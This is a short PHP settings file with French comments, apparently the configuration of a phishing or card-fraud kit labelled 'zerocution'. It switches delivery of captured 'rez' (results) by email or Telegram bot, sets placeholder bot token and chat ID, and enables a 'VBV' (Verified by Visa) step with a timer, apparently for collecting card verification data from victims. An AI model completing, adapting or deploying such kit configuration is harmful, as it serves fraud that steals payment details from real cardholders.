﻿<?php

#zerocution

# Mail
$mail_send = FALSE;                                           # False pour ne pas recevoir par Mail
$rezmail = "email@email.com";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "token";

$rez_chat = "id";                                 # Channel de réception des informations

# VBV

$vbv = true;
$timeVBV = "15";

# DEV

$test_mode = false;

?>